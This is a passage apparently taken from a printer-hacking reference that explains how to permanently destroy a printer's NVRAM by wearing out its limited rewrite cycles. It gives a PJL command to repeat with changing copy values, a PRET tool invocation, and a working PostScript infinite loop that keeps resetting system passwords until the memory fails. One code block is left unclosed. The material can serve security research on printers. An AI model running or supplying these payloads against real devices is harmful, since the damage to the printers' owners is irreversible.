Both components have a limited lifetime. Today, vendors of flash memory guarantee about 100,000 rewrites before any write errors may occur.

## PJL

For a practical test to destroy NVRAM write functionality one can continuously set the long-term value for the number of copies with different values for `X`:

```
@PJL DEFAULT COPIES=X
```

Usually, before stop allowing writing anymore NVRAM parameters are fixed to the factory default value and all variables could still be changed for the current print job using the `@PJL SET...` command.

Using [PRET](https://github.com/RUB-NDS/PRET):

```
./pret.py -q printer pjl

## PostScript

For PostScript, one needs to find an entry in the currentsystemparams dictionary which survives a reboot (and therefore must be stored in some kind of NVRAM). A good candidate would be a PostScript password.\
PostScript can run a script that corrupts its own NVRAM:

```
/counter 0 def
{ << /Password counter 16 string cvs
     /SystemParamsPassword counter 1 add 16 string cvs
  >> setsystemparams /counter counter 1 add def
} loop
```
